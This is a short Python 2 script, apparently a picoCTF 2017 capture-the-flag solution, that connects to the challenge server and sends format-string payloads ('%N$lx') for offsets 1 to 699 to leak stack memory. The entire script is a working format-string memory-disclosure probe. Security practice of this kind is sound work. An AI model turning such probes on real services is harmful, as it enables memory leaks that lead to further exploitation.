import struct
from socket import *

def grab(i):
  s = socket(AF_INET, SOCK_STREAM)
  s.connect(('shell2017.picoctf.com', 26325))

  s.recv(128)
  s.send('e %'+str(i)+'$lx\n')
  s.recv(64)

  data = s.recv(64)
  addr = data.split()[0]

  print i, addr
  s.close()

for z in range(1,700):
  grab(z)

